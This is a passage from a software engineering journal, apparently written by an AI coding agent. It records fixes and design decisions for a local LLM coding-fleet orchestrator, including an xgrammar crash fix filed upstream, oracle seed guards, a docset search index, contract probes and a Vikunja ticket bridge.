+harness. The cost, named: the simulator "knows" three plan-ids (`intred-*`,
+`recovered`), so a future scenario that reuses those id stems inherits their scripted
+effect — a documented coupling, not a hidden one.
+
+The genuinely un-wireable case was `redecompose-once-then-succeed`: it asserts the
+parent task ends `merged`, but the REAL re-decompose REPLACES the parent with its
+children (the parent id is gone from the plan), so no straight read of the final plan
+can show `add: merged`. Rather than diverge the simulator's re-decompose from the
+driver's, I drive the real `replace_task_with_children`, let the children merge, and
+AGGREGATE a replaced parent's reported status from its subtree in the result view only
+— honest ("the whole replacement subtree completed" IS merged) and it leaves the real
+transition untouched. This, and the per_task-vs-per_job budget wording, are the seams
+where W9's test-first mental model and A2's shipped driver simply differed; wiring was
+the reconciliation, done by matching the harness to the real code, never the reverse.
+
+**Next:** the merge owner reviews the two rig-grammar fake edits + the `plan_id`
+steering as the sanctioned resolution of A2's flag (or amends the seam signature to add
+explicit gate/recover channels and drops the `plan_id` reads). W8 then wires the live
+re-decompose model transport and runs the wave gate / job oracle on the Arc 140V
+(Stage-1 B1), at which point the same 30 scenarios become the model-free regression net
+under every future orchestration change — the dispatch-side analogue of the AO `evals/`
+gate.
+
+*(commit `<this>`: `shared/fleet/plan_graph.py` +`simulate_job_plan` (adapter over the
+real `SwapDriver._run_plan_waves`) + result/sandbox/fallback helpers; two rig-grammar
+fake edits + one anti-parallel-impl guard test in `tests/integration/
+test_job_pipeline_e2e.py`. e2e: 30/30 scenarios LIVE (0 skipped) + 14 meta/guard = 44
+passed. Real-driver suites 297/0 (byte-identical). Standing gate 5390 passed / 0 failed
+/ 21 known worktree env-skips / 121 deselected. Live re-decompose transport + Arc 140V
+wave-gate/oracle await W8. Lesson 212 tally.)*
+
+### 2026-07-05 — The three-layer empty string, and the oracle nobody showed the coder
+
+*Plain summary: #748 root-caused and fixed — the M2 plan-graph's "14B returns an empty
+plan" blocker was three stacked mechanical defects (a swallowed xgrammar crash, a
+tool-call bait, a tail bracket slip), none of them model capability; two further
+defects found by the first real graph run (a job oracle that could not import the
+built modules, and one the coder was never shown) closed by seeding the oracle into
+the repo; plan_graph flipped ON after the live proof. Subsystems: gpu_inference,
+entrypoint PLAN path, decompose, swap_ops/swap_driver, dispatch_harness report.*
+
+The handoff said one diagnostic cycle: log the pre-strip text, tell empty-generation
+from all-think, fix accordingly. The first thing I found was that the planned
+diagnostic would have measured the wrong layer. The text reaching `_plan_generate_fn`
+is not pre-strip at all — `_generate_from_prompt` carries its own think-strip, and
+unlike the entrypoint's non-greedy one it also eats *unclosed* think blocks, so
+"model thought past the token budget" and "model said nothing" are indistinguishable
+one frame up the stack. I instrumented both layers plus the exception path, all
+behind the same env-gated file dump the prior session had proven (a bare logger
+never surfaces from `shared.fleet.decompose` — that lesson held).
+
+One cancelled dispatch later the dump held the smoking gun, and it was neither of
+the two hypothesized cases. The PLAN call was crashing — every run, deterministically
+— inside xgrammar: `grammar_matcher.cc:627 ... GrammarMatcher has terminated after
+accepting the stop token`. The exact #725 crash the LA had turned the grammar OFF
+for, three days earlier. The TOML said off; the dataclass default said on; and the
+PLAN wrapper built a fresh `GenerationConfig()` that inherited the default, making
+it the only caller still armed. The crash then became a fail-closed result whose
+text is `""` and whose cause lives only in `.error` — which the wrapper never read.
+Three silent conversions in a row: crash → empty string → "the model returned
+nothing." The 14B was never even asked.
+
+I flipped the dataclass default so the crash-prone constraint is opt-in via the TOML
+(the conversational path, which resolves the knob, is unchanged; the latent-armed
+KV-warm and websearch sites are disarmed), made the PLAN wrapper raise on `.error`,
+and re-ran. The second layer surfaced immediately: the plan generation now completed
+— by calling a tool. The PLAN rode the conversational system prompt, whose tool
+directive advertises `search_knowledge`, and greedy decode chose
+`<tool_call>{"name": "search_knowledge", ...}` as its entire answer to "decompose
+this goal." `_strip_hidden_blocks` then reduced that to `""` — the same symptom as
+the crash, from an unrelated mechanism. The fix follows the grain of the design: an
+internal structural emission should never wear the conversational persona, so
+`generate_text` gained a `system_prompt` override and the PLAN sequence rides a
+minimal no-tools planning prompt, plus a fail-loud raise when stripping eats a
+non-empty response.
+
+Third run: the 14B emitted a *perfect* eight-task dependency graph — chain and
+diamond, contracts, the lot — and closed the final object `]]` where `}]` belonged.
+One wrong character; `json.loads` fails; zero candidates; minimal fallback. The
+trade-off here was real: the W2 grammar hook exists precisely to make malformed
+JSON impossible, but arming GenAI structured output on the live path tonight means
+riding the same xgrammar backend that had just crashed us — that belongs to #743
+with its own live proof. I went with a bounded deterministic repair in the tolerant
+parser instead — a string-aware bracket walk that closes what the model forgot and
+drops what it invented, invoked only after plain parsing fails — accepting that
+repair is a patch on model unreliability rather than a structural guarantee. The
+identical raw output parses at eight candidates. The §7.4 risk — "the 14B cannot
+emit usable dependency graphs" — is retired for this goal class: the model was right
+the whole time; every failure was plumbing between the model and the parser.
+
+Run four was the first real graph execution on the Arc 140V, and it was the best
+kind of live-verify: forty-two minutes of the machinery working — six tasks in four
+dependency-ordered waves, context packs assembled and consumed (the pack for the
+add-command honestly reported that the coder had built `class ExpenseStorage` where
+the contract promised `save_expenses()` functions — as-built truth correcting
+plan-time fiction, exactly the job packs exist for), all four wave gates green on
+the integrated tree — and then the job oracle failed the integrated whole, and the
+driver said so: "unit-green does not equal job-green," verdict PARKED-HONEST. The
+zero-FALSE-DONE invariant held under the strongest temptation a run has yet offered
+it. Two defects fell out of that honest red. The shallow one: the oracle runner
+invoked the bare `pytest` CLI, which does not put the repo root on `sys.path`, so a
+`tests/`-homed oracle importing root modules dies at collection on any correct
+build — one word of fix (`python -m pytest`). The deep one: the oracle imports the
+*planned* layout (`from commands.add import ...`), but nobody ever showed the coder
+the oracle — the plan document's own words are "the coder codes toward it," and the
+shipped build had the "never edits" half (restore-before-grade) without the "codes
+toward" half. The fix seeds the oracle into the target repo before wave one,
+wrapped in a module-level `pytest.skip` guard so per-task and wave gates skip it
+(skip, not fail — no fleet-script changes, no gate exclusions), while grade time
+already overwrites with the unwrapped plan bytes, so the guard costs nothing where
+it matters. Every task prompt now carries the #690 sentence at job scope: this file
+is the specification; its imports define the layout.
+
+One more honesty defect closed on the way: the harness report said `outcome: MERGED,
+verdict: COMPLETE, ok: true` for that PARKED-HONEST run — technically correct by its
+own run-health semantics, and a lie to any reader who does not know them. The battery
+scorer already adopts the driver scorecard (Lane V built that right); the per-job
+report now carries `job_verdict`/`job_attribution` first-class, so the JOB truth
+rides every surface a consumer might read.
+
+Run five — fresh sandbox, full fix set, oracle seeded — delivered the proof, in
+the honest grammar this system speaks: PARKED-HONEST again, but a *different*
+PARKED-HONEST. The seeding worked — the coder built the layout the oracle
+imports, and six of the oracle's seven tests passed on the integrated tree,
+every behavioral criterion among them. The single red was the launch-smoke test
+calling the app's `main()` in-process, so pytest's own command-line flags leaked
+into the app's argument parser — a structurally unfair test for any argv-reading
+CLI, and one that would have silently depressed the whole battery's green rate.
+The oracle template now instructs argv isolation for in-process entry-point
+calls (locked). The machinery live-verify is a PASS on every criterion the
+charter names — dependency-ordered waves, packs consumed, per-wave gates, the
+job oracle run on the integrated whole, honest verdicts and now an honest
+report surface — across two full runs that both refused to say "done" for the
+right reasons. The `plan_graph=true` flip stands on that: the *orchestration*
+is the proven feature; the first oracle-green B1 is the battery's to produce,
+with a fair smoke test. One grace note for the record: the #725 crash is now
+root-caused and fixed upstream in a same-commit rebuild (see the 2026-07-05
+PERFORMANCE_LOG entry), but the installed wheel is ABI-locked and unpatched —
+the grammar disarm this entry ships is the correct live posture until a patched
+release lands.
+
+**Next:** the overnight campaign in order — live negatives N1–N3 (a gate never
+watched failing is theater), the #746 research-substrate code (GPU-free, parallel),
+the full B1–B8 battery ×N for the §9.5 reliability statistics, then #744
+guest-isolation and the #742 coder A/B. Node-side oracle seeding needs its own
+guard design before the battery's node jobs (tracked on #740).
+
+*(commits: `<this>` (the fix set + flip + locks land with this entry); standing
+gate 5421/0 pre-live (AO-up env, 7 environmental skips) and the clean-env gate
+re-run at commit; ~20 new/re-pinned regression locks across the defect set; live
+evidence: runs `20260705-214803-bd` (2517s) and `20260705-224742-bd` (3891s),
+scorecards + report JSONs in the run dirs and
+`docs/performance/m2_plan_graph_live_verify_2026-07-05.json`. Lesson 214.)*
+
+### 2026-07-05 — The fix that couldn't be proven on the machine that broke
+
+*Plain summary: applied and verified the #725 xgrammar `IsStopTokenAccepted` fix (a two-line guard reorder in `xgrammar_backend.cpp`), rebuilt from the exact commit the crashing wheel was built from, hit an ABI wall trying to verify on GPU via the official Python wheel, pivoted to a standalone CPU-based C++ reproducer, and filed both the upstream issue (`openvinotoolkit/openvino.genai#4081`) and the fix PR (`#4082`) under the operator's account.*
+
+The root cause was exactly what yesterday's characterization pointed at: `XGrammarLogitsTransformer::apply()` called `FillNextTokenBitmask()` before checking `IsTerminated()`, and `FillNextTokenBitmask` is the call that asserts `!IsStopTokenAccepted()`. Reading the vendored source confirmed it in under a minute — the guard was one line too late. The fix itself (swap the two lines, plus the same guard in `accept_tokens()`) was the easy part; proving it took most of the session.
+
+The instinct was to prove it the way the bug was found — same wheel, same GPU, same everything, just patched. That instinct hit a wall immediately: OpenVINO GenAI's Python `.pyd` is compiled against a specific release build and dynamically links the core `openvino.dll` by name, not by path. Swapping only the rebuilt `openvino_genai.dll` into the venv produced `DLL load failed: The specified procedure could not be found` — an ABI mismatch between my local dev build (RelWithDebInfo, debug caps on, linked against a locally-built OpenVINO core) and the officially released wheel's expectations. The next attempt — reconfigure the local GenAI checkout with `ENABLE_PYTHON=ON` and build a matching `.pyd` from the same tree — solved the .pyd/.dll pairing but ran into the SAME class of ABI wall one layer down: my from-source build links against my local OpenVINO checkout's core, and that checkout has never linked its GPU plugin (the object files exist, nothing was ever linked into `openvino_intel_gpu_plugin.dll`). No amount of matching Python bindings fixes a plugin that was never built.
+
+The honest recalibration: the bug is a sampler state-machine ordering error — device-independent by construction, since it lives entirely in when a C++ guard is checked relative to a matcher call, with no GPU-specific numerics involved. So I wrote a small standalone C++ reproducer mirroring the Python one (`LLMPipeline` + `draft_model` + a triggered `StructuralTagsConfig`), built it against the patched library and the local checkout's CPU plugin — fully self-consistent, no ABI crossing — and ran the same before/after comparison there instead. Baseline (unpatched, same commit, GPU, the official wheel): 1 crash / 95 generations, reproducing the exact case and assertion from the original report. Patched (CPU): 0 / 95, same sample size. A spec-decode-OFF control on the patched build stayed clean at 0/19, confirming the fix doesn't touch the no-draft path.
+
+One judgment call along the way: the first patched run was sized at 17 passes (323 generations) to match the brief's "≥300-500" target, but CPU inference on a 14B model turned out to be roughly 20-25x slower per generation than the GPU baseline — the first pass alone took ~17 minutes, putting the full run at 5-6 hours. Rather than let a secondary verification (CPU was already a substitute, not the primary evidence) balloon past the primary GPU evidence in cost, I truncated to 5 passes (95 generations) — exactly matching the baseline's sample size for a clean apples-to-apples comparison — after checking in on the tradeoff rather than silently picking a number.
+
+Both the issue and the PR disclose the device substitution plainly: baseline on GPU (the originally-affected, officially-released configuration), fix verified on CPU (a from-source build, because the exact GPU configuration wasn't independently rebuildable in this environment), with the reasoning for why that substitution is valid stated in both places rather than glossed over. The alternative — silently presenting only the CPU numbers, or overclaiming a GPU-verified fix — would have been the weaker report even though it might have looked cleaner.
+
+**Next:** watch `openvinotoolkit/openvino.genai#4082` for maintainer review; the #725 re-enable criterion for `[generation].tool_call_grammar` (upstream fix released in the pinned version + a 20/20 boundary soak + one live tool turn) stays unmet until the PR merges and ships in a release. `C:\Users\mrbla\oss\openvino.genai-pr-worktree` holds the pushed fix branch for any follow-up review requests without redoing the fork/branch setup.
+
+*(Issue: `openvinotoolkit/openvino.genai#4081`. PR: `openvinotoolkit/openvino.genai#4082`, commit `4c797722` on `blairducrayoppat:fix/xgrammar-stop-token-spec-decode`, DCO-signed, AI-assistance disclosed. Verification record: `PERFORMANCE_LOG.md` 2026-07-05 entry + `docs/performance/xgrammar_stop_token_fix_verify_2026-07-05_15-34-27.json`. Vikunja #725 updated with both URLs; ticket stays open pending upstream merge + release. Lesson 210 tally.)*
+
+### 2026-07-06 — The guard that could not stand at the top of the file
+
+*Plain summary: node-side job-oracle seeding for the M2 plan-graph (#740) —
+`real_seed_job_oracle` now seeds `.mjs` oracles with a hoisting-proof
+`node:test` skip wrapper (guard header + line-commented body), closing the
+"node job-oracle seeding not yet designed" refusal; swap driver untouched;
++5 regression locks including a live `node --test` proof.*
+
+The python side of oracle seeding (e8e9813, last night) had an easy time of
+it: python executes a module top-to-bottom, so a `pytest.skip(...,
+allow_module_level=True)` prepended above the oracle's imports fires before
+any not-yet-built module can be imported. Porting the same idea to node
+looked like a one-liner — put `process.exit(0)` at the top of the seeded
+`.mjs` and let each `node --test` child process leave early. I proved that
+wrong before designing around it: a scratch file with `process.exit(0)` on
+line 1 and an import of a missing module on line 2 fails under node v24 with
+`ERR_MODULE_NOT_FOUND` — static ESM imports are *hoisted*, resolved at
+module-link time before ANY body statement runs. No top-of-file statement
+can beat them. The trap is invisible in a happy-path test (once the coder
+has built the modules, the imports resolve and the naive guard "works"),
+which is exactly the kind of latent gate-killer that would have fired on
+wave 1 of the next node job.
+
+The mechanism I chose ships the seeded copy with no linkable oracle
+statement at all: the only static import is the always-resolvable
+`node:test` builtin, one explicitly-skipped test registers (so `node --test`
+reports `skipped 1` / exit 0 — the honest mirror of the python guard's
+skip, visible in gate output rather than a silent zero-test pass), and the
+oracle body follows with every line `// `-commented — still the readable job
+spec the coder codes toward, its commented imports still stating the
+required module layout, but inert by construction. Two alternatives were
+rejected with reasons worth keeping: a `/* */` block wrap dies the moment
+the plan-generated oracle contains `*/` — which real test files do
+constantly (`/a*/` star regexes, `'src/**/*.mjs'` glob strings) — and
+converting the oracle's static imports to conditional dynamic `await
+import()` calls means regex surgery on arbitrary model-generated JS, where
+any transform miss becomes a syntax error or a live import of a missing
+module, i.e. a red wave gate on a correct build. Line comments are the only
+wrap that is content-safe for arbitrary bytes, and grading never needs to
+unwrap anything because `real_run_job_oracle` overwrites the whole file with
+the unwrapped plan bytes before running it (plan bytes always win, then the
+guarded copy is restored) — same contract as python, no env var, no gate
+exclusion. The swap driver needed zero changes; the extension dispatch
+lives entirely inside `real_seed_job_oracle`, which now also refuses
+fail-closed any future pinned oracle path whose extension has no designed
+guard — an unguarded seed would fail every per-task gate, so refusing to
+seed is strictly safer than seeding wrong.
+
+The load-bearing test is live machinery, not a mock: it seeds a guarded
+oracle whose imports point at modules that do not exist, drives the real
+`node --test` in both the grader's file-arg shape and the `npm test`
+discovery shape (clean pass, `skipped 1`), then writes the raw plan bytes at
+the same path — exactly what grading does — and asserts node now FAILS.
+That control leg is what keeps the green honest: a guard that "passed"
+against a runner that never collected the file would be theater.
+
+**Next:** the first live node-ecosystem plan-graph job (a `web`-surface goal)
+exercises this seed end-to-end on real hardware — seed committed on the
+target repo's main, wave gates skipping it, the grader's overwrite/restore
+visible in the run dir.
+
+*(commit `<this>` — swap_ops.py node seed guard + 5 regression locks in
+test_integration_gate.py; mandated selection 135 passed / 0 failed, swap/
+dispatch blast radius 257 + 143 passed. Field note (Node/JS ESM hoisting).)*
+
+### 2026-07-06 — Teaching the fleet to look things up before it guesses
+
+*Plain summary: #746 first slice — new `shared/research/` package: a local, zero-egress docset index (SQLite, built from the hash-pinned `models/docsets/` corpus) + deterministic-first lookup (`exact_lookup` → BM25 `search_docs` gated by a calibrated `RELEVANCE_FLOOR`) + the bounded `ground_goal` plan-grounding block. Unwired seams for decompose integration and UC-002 semantic rerank. 41 gate tests.*
+
+The coding fleet has been writing code from the 30B's memory of the world, and
+the #746 design said: give it two research points instead — ground the plan
+before the 14B decomposes, and give the coder a lookup it can pull on when it
+hits a named gap. The golden rules were already right in the ticket: pull not
+push, deterministic before fuzzy, a relevance floor that STOPS instead of
+serving noise, and every byte from local disk. What the ticket could not know
+was what the staged corpus actually looked like once opened, and most of this
+entry is what the corpus taught me.
+
+The first surprise: the readthedocs "htmlzip" bundles are not page trees —
+they are ONE sphinx-singlehtml page each (pytest: a single 4.3 MB HTML with
+~1,200 nested `<section id>` elements). My first build indexed pytest as *one
+page*, capped at 200k chars — retrieval over a third of the fleet's likely
+questions would have been a single giant, truncated blob. The fix is a linear
+split at `<section id="...">` boundaries (non-overlapping segments in document
+order; sub-120-char fragments fold into their neighbor so no text is dropped),
+which turned pytest into 916 real pages and Hypothesis into 1,463. I took
+BM25-over-plain-SQLite rather than FTS5 (compile-option dependency) or pickle
+(a code-execution surface on load) — pure-stdlib, postings in a b-tree, flat
+RAM at query time; the trade is ~50s of one-time build and a 103 MB derived
+file, both acceptable against a 134 MB corpus. The official python *text*
+archive duplicates the DevDocs python docset; I indexed both for corpus
+completeness and collapse same-title twins at query time rather than silently
+skipping a staged artifact.
+
+The floor was calibrated, not guessed: real queries put their top hit at
+0.47–0.91 normalized; gibberish tops out at 0.14; and the load-bearing junk
+class — ordinary English that collides with MDN example prose ("purple
+elephant birthday cake recipe" → 0.264) — is exactly what a 0.25 floor would
+have let through. `RELEVANCE_FLOOR = 0.35` keeps every measured real answer
+and stops every measured junk class, and the calibration numbers live in the
+constant's docstring so the next tuner starts from evidence.
+
+Two defects surfaced only because I ran the real corpus, not just the fixture.
+MDN page text carries U+2068/2069 bidi isolates — the trojan-source class —
+and my excerpt hygiene stripped only ASCII controls; excerpts ride into
+prompts, so the strip now covers Unicode format/direction controls end-to-end
+(and the pattern is built programmatically from code points after an
+escape-mangling round-trip proved literal control bytes in source are one
+linter away). And the exact tier's embedded-token fallback let plain English
+words that double as docset entries hijack results — a grounding block for a
+pytest goal led with the *JavaScript `with` statement* because "with" is a real
+entry. The rule that fixed it is the one worth keeping: only code-shaped
+tokens (dotted, underscored, or cased) may enter the embedded tier; a
+deliberate whole-string lookup of `with` still resolves, because that is rung
+one, not the fallback.
+
+What I deliberately did not do: wire `ground_goal` into `decompose.py` (the
+integrator does that after independent verify — the seam is documented in the
+module docstring), and wire the NPU embedding rerank (`semantic_rerank` is a
+named identity seam pointing at the UC-002 machinery, contracted to reorder
+but never resurrect what the floor rejected). Failure posture is split on
+purpose: the coder-facing lookups raise loudly when the corpus is unstaged
+(naming `scripts/stage_docsets.py`), while plan grounding degrades to "" —
+enrichment must never break decompose.
+
+**Next:** integrator wires `ground_goal` into the decompose prompt assembly
+and registers `search_docs`/`exact_lookup` as OpenCode coder tools
+(agentic-setup side, out of this slice); follow-up slice plugs the UC-002
+embedding rerank into the named seam; consider committing
+`scripts/stage_docsets.py` + the tracked manifest if still untracked.
+
+*(commit `<this>` — shared/research/ package (docset_index, lookup,
+plan_grounding) + 41 tests in shared/tests/test_research_substrate.py; full
+shared/tests 1300/0 on the venv, LOCALAPPDATA redirected; real-corpus build:
+13,803 pages / 26,329 symbols / 126,933 terms / 102.9 MB / 52.1s on the
+runtime 3.11.9; integration test builds the real index in tmp and proves
+json.dumps, Element.querySelector, pytest-fixture search, junk-STOP. Lesson 48 tally.)*
+
+### 2026-07-06 — The third time it broke, I built the thing that checks
+
+*Plain summary: shipped the L188 third-instance structural control (Vikunja
+#739) — a live external-contract probe registry (`shared/security/external_probes.py`),
+a `--probe` CLI for the Kagi web_search adapter
+(`services/assistant_orchestrator/src/websearch/probe.py`), and the gate test
+that enforces enrollment (`tests/security/test_external_probe_registry.py`, +8);
+pure observability/enforcement scaffolding — the egress door, its allowlist, and
+`[web_search]` config are byte-untouched.*
+
+Lesson 188 says an external contract is a *fact that can rot* — the URL, the
+method, the auth scheme, the response shape are each things reality can change
+between "built dormant" and "go live," and only a live probe with the real
+credential settles them. It had earned its number the honest way: Kagi's
+documented, coupling-tested v0 endpoint 401'd the instant the egress chain first
+opened (#719/#724), then the EAGLE-3 exporter "existed" but wouldn't load the
+published checkpoints (2026-06-29), then Chrome/Edge 149 emitted no console where
+v137 did (2026-07-03). Three instances, and the LESSONS.md SOP is unambiguous: the
+third recurrence must ship an *enforced* control, not another per-instance patch.
+That debt had been sitting open, flagged in the 2026-07-04 fold, tracked as #739.
+This closes it.
+
+The shape of the control is a registry plus a gate. The registry is a pure
+declarative table — each external-contract adapter names its module, its
+`--probe` entrypoint, and the contract axes the probe checks — and the gate test
+does the enforcing with two teeth: every registered probe entrypoint must import
+and be callable *without any network I/O at import* (proven by importing it in a
+subprocess whose `socket` explodes on use), and a structural AST sweep fails the
+standing gate if any module under `services/` or `shared/` reaches the egress
+door's `fetch_external`/`fetch_external_binary` entrypoints without enrolling. A
+new web adapter that skips its probe can't land green — that is the whole point.
+
+Two design calls are worth keeping on the record. First, the probe fetches
+through the real egress door, not a private HTTP client of its own. The tempting
+version — give the probe its own `httpx` — would have widened BlarAI's
+foundational one-network-client carve-out from exactly one file to two and tripped
+`test_no_external_egress`. So the probe instead does exactly what the go-live
+operator does: registers a tightly-scoped adjudicator that ALLOWs only its one
+endpoint+purpose, fires the single fetch through the door (which still runs the
+full SSRF guard + widen/revoke), and restores the prior door posture in a
+`finally`. The accepted cost is a little coupling to the door's registration seam;
+the property bought is that the probe cannot become a second egress path. Second,
+the sweep keys on the two fetch *entrypoint names* via AST, not on "imports the
+guarded_fetch module at all." The looser signal would have false-positived on the
+AO entrypoint (which imports the module only to register the adjudicator) and on
+`knowledge_bank` (which imports the door's image *validators*, no fetch), forcing
+real code into a justified-exclusion list as noise. The precise signal finds
+exactly three door-reaching modules on today's tree — the Kagi adapter, its own
+probe, and the UC-003 ingest coordinator — and all three are accounted for with
+zero false positives.
+
+The ingest coordinator is the one genuine judgment call in that list, and I
+resolved it as a *justified exclusion*, not a fake probe. It reaches the door, but
+it fetches arbitrary user-pasted URLs — there is no fixed vendor endpoint, auth
+scheme, or response schema to probe; its defense is the per-fetch PA adjudication
+and the guest parser, already covered by the door's own gate tests. Writing it a
+"contract probe" would have been theater. The honest scope note also names what
+this control cannot reach: two of L188's three instances (the model-exporter
+toolchains, the browser console harness) live outside this repo, so their probes
+belong to the repos that own them — I documented the exclusion in the registry
+rather than imply coverage I don't have. And one small trap the work surfaced: the
+probe module itself imports `fetch_external`, so my own sweep flagged it — I fixed
+that by treating registered *probe* modules as enrolled alongside their adapters,
+never by blanket-exempting anything named "probe," which would have blunted the
+teeth. The probe also refuses with a clear exit-2 message when no credential is
+provisioned — it never fakes a pass, the same "keep the green honest" property the
+node-oracle seed guard leaned on the day before.
+
+**Next:** the real-credential probe run is the integrator's step — at the
+web_search go-live ceremony (now Step 3.5 in `docs/runbooks/web_search_go_live.md`),
+run `python -m services.assistant_orchestrator.src.websearch.probe --probe` right
+after key placement and expect `CONTRACT VERIFIED` / exit 0 before the flag flip;
+a `CONTRACT DRIFT` / exit 1 (an HTTP 401 is the #724 signature) stops the ceremony
+cheaply, before the irreversible first GET. The next external-contract adapter
+(the second web tool, whenever it lands) must enroll a probe or the gate refuses
+it.
+
+*(commit `<this>` — `shared/security/external_probes.py`,
+`services/assistant_orchestrator/src/websearch/probe.py`,
+`tests/security/test_external_probe_registry.py` (+8 gate tests),
+`docs/runbooks/web_search_go_live.md` Step 3.5; probe verified refusing exit-2
+with no credential + bare-invocation no-network; the real-credential
+CONTRACT-VERIFIED run is the integrator's go-live step. Lesson 188 — third-instance control shipped.)*
+
+### 2026-07-06 — The queue the run dirs never kept
+
+*Plain summary: built the #749 dispatch→Vikunja bridge — one durable ticket per dispatched coding job (created at dispatch, outcome at REPORT, closed only on a GREEN + oracle-passed scorecard), knob-gated OFF and fail-soft; the socket is factored into the dev tier so `shared/` stays air-gap-clean. New `shared/fleet/vikunja_bridge.py` + `tools/dispatch_harness/vikunja_http.py`, wired into the battery runner and the harness, dormant in `swap_driver.py` behind a #749 TODO.*
+
+The fleet's plan-graph is a strong memory *inside* a job — hash-sealed identity, evidence-gated statuses, an oracle-gated done. But *across* jobs it forgets everything the moment the run dir goes cold: a PARKED-HONEST outcome, an eyeball tier, a report-named follow-up — all of it dies in `state/fleet-runs/<id>/` that nobody re-opens. The operator has a durable unfinished-business queue for his own dev harness; the coding fleet had none. This bridge gives him one: a Vikunja ticket per dispatched job that carries the outcome forward and, crucially, stays OPEN when the job parked or stalled, with the evidence pointers attached. It is the actionable inbox the run dirs were never going to be.
+
+The load-bearing trade-off is **outcomes, not heartbeats**, and I have a graveyard to point at for why. Project 8, "Fleet Reports," is Defunct precisely because the April dev-fleet posted a ticket per phase per wake — a notification firehose the operator learned to ignore inside a day. A queue you ignore is worse than no queue, because it *looks* like coverage. So the shape here is deliberately austere: one ticket per job, one comment per *meaningful transition*, and nothing — nothing — per wake. The swap driver's REPORT phase and the nightly battery are the only writers; a mid-run heartbeat has no code path to exist. I would rather this bridge under-report than teach the operator to tune it out.
+
+The FALSE-DONE-shaped lock is where the judgment concentrates. A ticket closes on exactly one condition: the verdict is GREEN **and** `evidence.oracle_status == "passed"`. A GREEN whose oracle merely didn't run does not close; a PARKED-HONEST comments and stays open; a rigged B8 whose negative failed to fire gets rewritten to FALSE-DONE by the battery's cross-check *before* the post, so it lands as an open ticket, never a wrongly-closed one. That last point forced a real wiring decision: the harness's own post-adoption seam sees only the *raw* driver scorecard, pre-cross-check — so if it posted for battery jobs, a lying B8 GREEN would slam its ticket shut. I resolved it by making the harness seam opt-in (`report_outcomes_to_vikunja`, default off) and having the battery own the authoritative post after its cross-check. The battery keeps the harness seam dark, so a completed job posts exactly one comment — the cross-checked truth — and never two. There is a regression test that drives a full dry-run battery through a fake Vikunja and asserts precisely that: one ticket, one comment.
+
+The sharpest surprise was structural, and it corrected the task's own premise. The brief said "put it in `shared/fleet/`, stdlib urllib to loopback — it's dev-side dispatch tooling, not the sealed runtime." But the air-gap import control on disk (`tests/security/test_no_external_egress.py`) does not agree: it scans `shared/` *as* a runtime root and forbids `urllib.request` there, with a companion test asserting that exactly one runtime file — the guarded-fetch egress door — imports a network client. Importing urllib in `shared/fleet/vikunja_bridge.py` would have tripped both, and the tempting "fix" — widening the one-door exemption — is exactly the deliberate, reviewable weakening of BlarAI's foundational property that I have no business doing unilaterally. So I routed around it instead of through it: the pure logic and the non-negotiable loopback pin live in `shared/fleet/vikunja_bridge.py` (which imports only `urllib.parse`, explicitly allowed), and the one place a socket actually opens is `tools/dispatch_harness/vikunja_http.py` — the dev tier the scan deliberately excludes. The air-gap control stays green and un-widened; the sealed runtime grows no network client; the bridge is honestly where its home is (the ticket itself says "dev-side dispatch layer"). The premise was wrong about `shared/`, and the control on disk was the thing that told me so.
+
+Everything is dormant: `[fleet_dispatch].vikunja_bridge = false` (and an unset project id `0` refuses to post even when flipped on), so nothing reaches Vikunja until a supervised live proof. Fail-soft is absolute — a 2 s per-call cap, no retries, every exception logged and swallowed — because a Vikunja outage must never slow or fail a battery night. The one thing I could not do headless is the live post against the real Vikunja on `:3456`; that is the integrator's supervised step, and I did not attempt it.
+
+**Next:** the supervised live proof — create the "BlarAI Coder Jobs" Vikunja project, set its id in `[fleet_dispatch].vikunja_bridge_project_id`, flip `vikunja_bridge = true`, and drive one real dispatch to watch a ticket open at dispatch, take its outcome comment at REPORT, and close only on an oracle-green scorecard. Then the driver-side leg: wire the REPORT-phase seam in `swap_driver.py` (today a #749 TODO) so a live swap-driven job posts without the battery, keeping the detached driver's ticket I/O off the critical swap path. After that, the campaign ticket for the nightly battery's morning report (`post_campaign_summary` is built and tested, unwired).
+
+*(Lesson 40 tally.)*
+
+### 2026-07-06 — The readiness signal that lied, and the language nobody asked for
+
+*Plain summary: diagnosed the M2 battery night-1 cascade (#750) by reading the
+swap driver instead of trusting the ticket — the RESTART-AO relaunch DOES poll
+`backend_ready()`, but `real_backend_ready` is a bare TCP `socket.create_connection`
+that false-positived on a starting-then-dying launcher, so the driver honestly-but-
+wrongly declared "14B is back." Landed #750 fix 2 (the battery runner re-ensures the
+AO before each job — `tools/dispatch_harness/battery.py`) to break the cascade today;
+fix 1 (readiness hardening + instrumentation) rides the supervised residency. Along
+the way found the baseline arm was measuring a misconfiguration: both B1 and B2 built
+C#/.NET for Python-oracle jobs.*
+
+Night-1 of the reliability campaign stalled after two jobs. B1 and B2 parked
+honestly (BUILD attribution — real coder work, zero FALSE-DONE), then B4 and B6
+STALLED with "could not connect to the Assistant Orchestrator on :5001." The ticket
+(#750) named the cause confidently: the swap-back's RESTART-AO "declares success
+without polling `backend_ready`." That would have been a satisfying one-line fix.
+It was also wrong.
+
+Reading `swap_driver._restart_with_retry` on `main`: the relaunch loop already
+awaits `backend_ready()` and only logs "BlarAI's 14B is back" when it returns True
+(lines 1629→1632). The B2 swap-progress log reached that line — so `backend_ready()`
+returned **True** — yet `state/fleet-swap/current.json` sits at phase RECOVERED with
+:5001 dead and no new SWAP_FAILED file. A poll that already exists cannot be the bug.
+The real defect is one level down: `real_backend_ready` is a bare
+`socket.create_connection(("127.0.0.1", 5001))`. It proves *a* socket accepted *one*
+connection — not that the AO is serving and will stay up. Under the launcher's
+single-instance-lock race (lesson-209 shape) a relaunched launcher can bind :5001,
+get connected-to, then exit; the driver connects in that window and declares
+victory. This is the #748 "a success message with no verification behind it" class,
+recurring one layer deeper — a *readiness* signal this time instead of a *done*
+signal. It is exactly why the campaign's rule is to read the code and prove the
+mechanism, not accept the first plausible story: the LA's instinct, and the #748
+scar tissue, both said so.
+
+Proving the false-positive empirically (instrument `backend_ready` to record what it
+observed; run five-plus sequential swap-backs and show zero false-readies) is the
+residency's job — a single green swap-back proves nothing about an intermittent bug
+that worked after B1 and failed after B2. But the *recovery* needs no residency, so I
+decoupled it on the LA's steer: **fix 2** — the battery runner now health-checks
+:5001 before each job and re-boots the launcher (`python -m launcher`, production
+mode, detached) if it is down, waiting out any in-flight relaunch first so it never
+stacks a second launcher into the instance lock. On its own that would have turned
+night-1's four-job cascade into a single stalled job followed by a clean re-boot. It
+is fully offline-testable (injected `ready`/`boot`/`sleep`; eight new gate tests,
